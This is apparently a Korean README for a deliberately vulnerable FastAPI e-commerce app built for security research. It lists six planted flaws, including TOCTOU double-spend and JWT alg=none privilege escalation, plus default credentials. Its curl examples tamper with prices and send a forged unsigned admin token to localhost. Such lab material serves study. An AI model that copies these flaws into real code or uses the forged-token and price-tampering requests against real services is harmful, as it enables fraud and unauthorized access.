# vuln_shop v2

FastAPI + SQLite + JWT 기반 취약점 연구용 e-commerce 서비스.
실제 HTTP 요청으로 각 취약점을 트리거할 수 있습니다.

## 구조

```
vuln_shop_v2/
├── app/
│   ├── main.py          # FastAPI 앱
│   ├── database.py      # SQLAlchemy 모델 + SQLite
│   ├── auth.py          # JWT 인증 (BUG-7 포함)
│   ├── seed.py          # 초기 데이터
│   └── routers/
│       ├── auth.py      # /auth/register, /auth/login
│       ├── orders.py    # /orders/ (BUG-1,2,3,5,6)
│       └── products.py  # /products/, /admin/*
├── tests/
│   └── test_exploits.py # 실제 HTTP 익스플로잇 데모
└── requirements.txt
```

## 취약점 목록

| ID     | 위치                       | 유형                    | 심각도   |
|--------|----------------------------|-------------------------|----------|
| BUG-1  | `routers/orders.py`        | 음수 수량 입력 허용      | High     |
| BUG-2  | `routers/orders.py`        | 쿠폰 중첩 적용          | High     |
| BUG-3  | `routers/orders.py`        | TOCTOU double-spend     | Critical |
| BUG-5  | `routers/orders.py`        | 중복 취소 환불          | High     |
| BUG-6  | `routers/orders.py`        | 클라이언트 가격 조작    | Critical |
| BUG-7  | `auth.py`                  | JWT alg=none 권한 상승  | Critical |

## 실행

```bash
pip install -r requirements.txt

# 서버 실행
uvicorn app.main:app --reload
# → http://localhost:8000/docs

# 익스플로잇 데모
python tests/test_exploits.py

# 기본 계정
# alice / password123  (user, 잔액 $500)
# bob   / password123  (user, 잔액 $100)
# admin / admin1234    (admin)
```

## API 흐름 예시

```bash
# 1. 로그인
TOKEN=$(curl -s -X POST http://localhost:8000/auth/login \
  -d "username=alice&password=password123" | jq -r .access_token)

# 2. BUG-6: 클라이언트 가격 조작
curl -X POST http://localhost:8000/orders/quick \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"product_id":1,"quantity":1}],"total":0.01}'

# 3. BUG-7: 서명 없는 JWT로 관리자 접근
FORGED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIzIiwicm9sZSI6ImFkbWluIn0."
curl http://localhost:8000/admin/users \
  -H "Authorization: Bearer $FORGED"
```
